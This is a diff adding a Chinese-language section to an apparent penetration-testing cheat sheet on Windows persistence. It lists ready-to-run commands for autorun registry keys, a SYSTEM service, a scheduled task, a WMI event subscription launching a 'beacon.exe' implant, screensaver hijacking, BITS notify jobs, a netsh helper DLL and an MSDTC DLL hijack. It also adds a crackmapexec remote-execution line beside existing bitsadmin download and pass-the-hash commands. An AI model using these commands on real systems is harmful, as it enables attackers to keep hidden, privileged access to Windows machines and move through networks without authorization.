@@ -536,6 +536,132 @@ bitsadmin /transfer n http://192.168.1.1/1.exe  C:\test\update\1.exe
 ```
 
 
+## windows权限维持
+
+### Startup目录
+```
+NT6以后的目录如下：
+
+对当前用户有效：
+C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+对所有用户有效：
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+NT6以前的目录如下：
+
+对当前用户有效：
+C:\Documents and Settings\Hunter\「开始」菜单\程序\启动
+对所有用户有效：
+C:\Documents and Settings\All Users\「开始」菜单\程序\启动
+
+```
+### 注册键
+
+```
+reg add "XXXX" /v evil /t REG_SZ /d "[Absolute Path]\evil.exe"
+
+```
+
+```
+1.Load注册键
+HKEY_CURRENT_USER＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Windows＼load
+
+2.Userinit注册键
+HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼Userinit
+通常该注册键下面有一个userinit.exe。该键允许指定用逗号分隔的多个程序，如userinit.exe,evil.exe。
+
+3.Explorer＼Run注册键
+Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
+HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
+HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
+Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
+
+4.RunServicesOnce注册键
+RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
+HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnce
+HKEY_LOCAL_MACHINE＼Software＼Microsoft＼ Windows＼CurrentVersion＼RunServicesOnce
+
+5.RunServices注册键
+RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。
+HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼ RunServices
+HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼ CurrentVersion＼RunServices
+
+6.RunOnce＼Setup注册键
+HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup
+HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup
+
+7.RunOnce注册键
+安装程序通常用RunOnce键自动运行程序，它的位置在
+HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
+[小于NT6]HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceEx
+HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
+HKEY_LOCAL_MACHINE下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；HKEY_CURRENT_USER下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。
+
+8.Run注册键
+HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
+HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
+Run是自动运行程序最常用的注册键，HKEY_CURRENT_USER下面的Run键紧接HKEY_LOCAL_MACHINE下面的Run键运行，但两者都在处理“启动”文件夹之前。
+```
+
+### 服务
+```
+sc create evil binpath= "cmd.exe /k [Absolute Path]evil.exe" start= "auto" obj= "LocalSystem"
+```
+
+### 计划任务
+
+```
+SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\evil\eviltask /TR C:\Users\hunter\Desktop\evil.exe
+```
+
+### WMI事件
+
+```
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="evil", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 310"
+
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="evilConsumer", ExecutablePath="C:\Users\hunter\Desktop\beacon.exe",CommandLineTemplate="C:\Users\hunter\Desktop\beacon.exe"
+
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"evil\"", Consumer="CommandLineEventConsumer.Name=\"evilConsumer\""
+
+```
+
+### 屏幕保护
+
+```
+reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d C:\Users\hunter\Desktop\beacon.exe /f
+reg add "hkcu\control panel\desktop" /v ScreenSaveActive /d 1 /f
+reg add "hkcu\control panel\desktop" /v ScreenSaverIsSecure /d 0 /f
+reg add "hkcu\control panel\desktop" /v ScreenSaveTimeOut /d 60 /f
+```
+
+### bitsadmin
+```
+bitsadmin /create evil
+bitsadmin /addfile evil "C:\Users\hunter\Desktop\beacon.exe" "C:\Users\hunter\Desktop\beacon.exe"
+bitsadmin.exe /SetNotifyCmdLine evil "C:\Users\hunter\Desktop\beacon.exe" NUL
+bitsadmin /Resume evil
+```
+
+### Netsh白加黑
+
+```
+可以通过导入helperdll的方式做权限维持，命令格式如下：
+netsh add helper [Absolute evil DLL path]
+但是由于netsh并不会开启自启动，因此还要再写一条自启动项：
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Pentestlab /t REG_SZ /d "cmd /c C:\Windows\System32\netsh"
+重新启动后依然可获得shell：
+```
+
+### MSDTC
+
+在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。
+默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启：
+```
+sc qc msdtc
+sc config msdtc start= auto
+
+```
+
+
 ## windows信息收集常用命令
 ```
 Systeminfo 计算机详细信息(补丁信息)
@@ -721,6 +847,11 @@ FOR /F %%i in (hash.txt) do atexec.exe -hashes :"%%i" test/administrator@192.168
 cme 批量
 ```
 proxychains4 ./cme smb 10.0.0.1/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d xx.org -x "net user"
+```
+
+单独执行命令
+```
+crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
 ```
 
 
